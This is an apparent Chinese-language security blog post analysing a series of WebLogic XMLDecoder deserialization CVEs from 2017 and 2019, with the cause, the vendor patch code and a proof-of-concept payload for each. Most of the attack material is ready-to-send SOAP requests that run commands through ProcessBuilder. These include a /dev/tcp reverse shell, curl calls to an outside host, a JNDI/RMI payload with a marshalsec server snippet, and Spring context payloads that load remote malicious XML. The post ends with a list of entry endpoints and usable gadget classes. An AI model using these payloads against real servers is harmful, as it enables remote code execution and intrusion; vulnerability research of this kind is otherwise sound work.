---
layout:     post
title:      "weblogic xmlDecoder反序列化"
subtitle:   ""
date:       2020-09-09 12:00:00
author:     "seal"
header-img: "img/post-bg-infinity.jpg"
tags:
    - web安全
    - weblogic
    - java
    - 反序列化
typora-root-url: ../../luckseal.github.io
---

#### weblogic XMLDecoder 反序列化漏洞
CVE-2017-3506
CVE-2017-10271
CVE-2017-10352
CVE-2019-2725
CVE-2019-2729
#### CVE-2017-3506
##### 漏洞原因
反序列化数据可控，且对数据未进行任何过滤处理
```
public WorkContextXmlInputAdapter(InputStream var1){
    this.xmlDecoder = new XMLDecoder(var1);
}
```
##### poc
```
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
                <void index="2">
                  <string>whoami</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
```

##### 补丁
```
private void validate(InputStream is) {
      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
      try {
         SAXParser parser = factory.newSAXParser();
         parser.parse(is, new DefaultHandler() {
            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
               if(qName.equalsIgnoreCase("object")) {
                  throw new IllegalStateException("Invalid context type: object");
               }
            }
         });
      } catch (ParserConfigurationException var5) {
         throw new IllegalStateException("Parser Exception", var5);
      } catch (SAXException var6) {
         throw new IllegalStateException("Parser Exception", var6);
      } catch (IOException var7) {
         throw new IllegalStateException("Parser Exception", var7);
      }
   }
```
限制了object的使用

#### CVE-2017-10271&CVE-2017-10352
##### 漏洞原因
只限制了object。
未new, method, void，array等。
##### poc
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```
##### 补丁
```
private void validate(InputStream is) {
   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
   try {
      SAXParser parser = factory.newSAXParser();
      parser.parse(is, new DefaultHandler() {
         private int overallarraylength = 0;
         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
            if(qName.equalsIgnoreCase("object")) {
               throw new IllegalStateException("Invalid element qName:object");
            } else if(qName.equalsIgnoreCase("new")) {
               throw new IllegalStateException("Invalid element qName:new");
            } else if(qName.equalsIgnoreCase("method")) {
               throw new IllegalStateException("Invalid element qName:method");
            } else {
               if(qName.equalsIgnoreCase("void")) {
                  for(int attClass = 0; attClass < attributes.getLength(); ++attClass) {
                     if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) {
                        throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass));
                     }
                  }
               }
               if(qName.equalsIgnoreCase("array")) {
                  String var9 = attributes.getValue("class");
                  if(var9 != null && !var9.equalsIgnoreCase("byte")) {
                     throw new IllegalStateException("The value of class attribute is not valid for array element.");
                  }
```
限制了object、new、method且viod只能使用index属性,array的class属性只能为byte


#### cve-2019-2725
##### 漏洞原因
未限制class
##### poc

> weblogic12

```
POST /wls-wsat/CoordinatorPortType11;/../x HTTP/1.1
Content-Type: text/xml
SOAPAction: ""
Content-Length: 824
Host: 192.168.132.131
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <class><string>org.slf4j.ext.EventData</string><void><string>
<![CDATA[
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>curl http://192.168.132.1/ReadMe.txt</string>
</void>
</array>
<void method="start"/></void>
]]>
</string></void></class>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```
原理，未限制的使用class，可以生成java实例，EventData构造函数中存在2次反序列化操作。使用class绕过限制，并将函数调用等攻击语句放入string中，绕过检测

>  weblogic10

使用UnitOfWorkChangeSet类进行2次反序列化，传入参数为byte[]，且array可使用byte

>  通用

payload

>rmi类型

```
<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java><class><string>com.sun.rowset.JdbcRowSetImpl</string><void>
<property name="dataSourceName"><string>rmi://192.168.132.1:9998/aa</string></property><property name="autoCommit"><boolean>true</boolean></property>
</void></class>
</java>
 </work:WorkContext>
 </soapenv:Header> <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```
```
import com.google.inject.internal.cglib.core.$CodeGenerationException;
import marshalsec.jndi.RMIRefServer;

import java.io.IOException;
import java.net.URL;

public class test {
    public static void main(String[] args) {
        try{
            URL url=new URL("http://192.168.132.1/#Exploit");
            RMIRefServer RMIRefServer=new RMIRefServer(9998,url);
            RMIRefServer.run();
        }
        catch(IOException e ){
            return;
        }
    }
}


```


>ClassPathXmlApplicationContext类

```
POST /wls-wsat/CoordinatorPortType11;/../x HTTP/1.1
Content-Type: text/xml
SOAPAction: ""
Content-Length: 585
Host: 192.168.132.131
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <class><string>com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext</string><void><string>
http://192.168.132.1/1.xml
</string></void></class>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>

```

>FileSystemXmlApplicationContext类

```
POST /wls-wsat/CoordinatorPortType11;/../x HTTP/1.1
Content-Type: text/xml
SOAPAction: ""
Content-Length: 586
Host: 192.168.132.131
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>
http://192.168.132.1/1.xml
</string></void></class>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

>恶意xml

```
<?xml version="1.0" encoding="utf-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>/bin/bash</value>
        <value>-c</value>
        <value><![CDATA[curl http://192.168.132.1/ReadMe.txt]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```
原理使用class创建java实例，使用ClassPathXmlApplicationContext或者FileSystemXmlApplicationContext加载远程xml文件，生成been，在xml中使用init-method设定初始化函数。
![](image/1.gif)

##### 补丁
将class加入黑名单

#### cve-2019-2729
##### 漏洞原因
在JDK1.6中可使用`<array method =“forName”>`获取java实例。
##### poc
将cve-2019-2725中`class`替换为`<array method =“forName”>`
##### 补丁
允许
无属性：string、int、long、byte、boolean、short、char、float、double
array标签：class=byte、以及length属性
void标签：index属性
java标签：class=java.beans.XMLDecoder、以及version属性

#### other
##### 攻击入口总结

> /_async/AsyncResponseService

利用时需设置
```
<ads:Action></ads:Action>
<ads:RelatesTo></ads:RelatesTo>
```

>/wls-wsat/CoordinatorPortType


##### 可利用类总结

>oracle.toplink.internal.sessions.UnitOfWorkChangeSet（weblogic 10.3.6）

二次反序列化，传入参数为byte[]，且array可使用byte

>org.slf4j.ext.EventData（weblogic 12.1.3）

二次反序列化，传入参数为string，进入构造函数，直接进行反序列化处理

>com.sun.rowset.JdbcRowSetImpl（需要可以外联）

rmi加载远程攻击类

>ClassPathXmlApplicationContext、FileSystemXmlApplicationContext（需要可以外联）

加载远程xml文件，生成been，在xml中使用init-method设定初始化函数。

参考文章：
https://paper.seebug.org/487/
https://www.freebuf.com/vuls/178510.html
https://mp.weixin.qq.com/s/qxkV_7MZVhUYYq5QGcwCtQ
https://www.freebuf.com/column/203859.html
https://mp.weixin.qq.com/s/QYrPrctdDJl6sgcKGHdZ7g
https://www.freebuf.com/vuls/202800.html
http://xxlegend.com/2018/10/23/Weblogic%20CVE-2018-3191%E5%88%86%E6%9E%90/
https://paper.seebug.org/623/
https://www.cnblogs.com/JoeyWong/p/9304913.html
http://www.heibai.org/post/1359.html
http://www.heibai.org/post/1367.html
https://xz.aliyun.com/t/5496
